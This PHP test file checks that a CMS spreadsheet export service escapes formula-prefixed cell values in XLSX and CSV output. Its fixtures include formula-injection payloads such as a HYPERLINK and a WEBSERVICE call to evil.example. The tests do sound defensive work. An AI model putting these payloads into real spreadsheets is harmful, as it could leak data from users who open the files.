<?php

use App\Services\CmsSpreadsheetService;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
use Symfony\Component\HttpFoundation\StreamedResponse;

function captureSpreadsheet(StreamedResponse $response): string
{
    ob_start();

    $response->sendContent();

    return (string) ob_get_clean();
}

function loadExportedSheet(string $content, string $extension): Worksheet
{
    $path = tempnam(sys_get_temp_dir(), 'mhcst-export-test').'.'.$extension;
    file_put_contents($path, $content);

    try {
        return IOFactory::load($path)->getActiveSheet();
    } finally {
        @unlink($path);
    }
}

test('xlsx export stores formula-prefixed strings as text, not formulas', function () {
    $response = CmsSpreadsheetService::downloadXlsx(
        'students.xlsx',
        'Students',
        ['Student No', 'Name', 'Count'],
        [
            ['20260001', '=HYPERLINK("http://evil.example/steal","click")', 5],
            ['20260002', '+SUM(A1:A9)', '@WEBSERVICE("http://evil.example")'],
        ],
    );

    $sheet = loadExportedSheet(captureSpreadsheet($response), 'xlsx');

    expect($sheet->getCell('B2')->getDataType())->not->toBe(DataType::TYPE_FORMULA)
        ->and($sheet->getCell('B2')->getValue())->toBe('=HYPERLINK("http://evil.example/steal","click")')
        ->and($sheet->getCell('B3')->getDataType())->not->toBe(DataType::TYPE_FORMULA)
        ->and($sheet->getCell('B3')->getValue())->toBe('+SUM(A1:A9)')
        ->and($sheet->getCell('C3')->getDataType())->not->toBe(DataType::TYPE_FORMULA)
        ->and($sheet->getCell('C3')->getValue())->toBe('@WEBSERVICE("http://evil.example")')
        ->and($sheet->getCell('A2')->getValue())->toBe(20260001)
        ->and($sheet->getCell('C2')->getDataType())->toBe(DataType::TYPE_NUMERIC);
});

test('csv export keeps formula-prefixed strings as literal text', function () {
    $response = CmsSpreadsheetService::downloadCsv(
        'students.csv',
        ['Name'],
        [['=1+1>definitely-not-a-formula']],
    );

    $content = captureSpreadsheet($response);

    expect($content)->toContain('"=1+1>definitely-not-a-formula"');
});

test('ordinary content is untouched by the formula guard', function () {
    $response = CmsSpreadsheetService::downloadXlsx(
        'students.xlsx',
        'الطلاب',
        ['الاسم'],
        [['علي أحمد سالم']],
    );

    $sheet = loadExportedSheet(captureSpreadsheet($response), 'xlsx');

    expect($sheet->getCell('A2')->getValue())->toBe('علي أحمد سالم')
        ->and($sheet->getCell('A2')->getDataType())->toBe(DataType::TYPE_STRING);
});
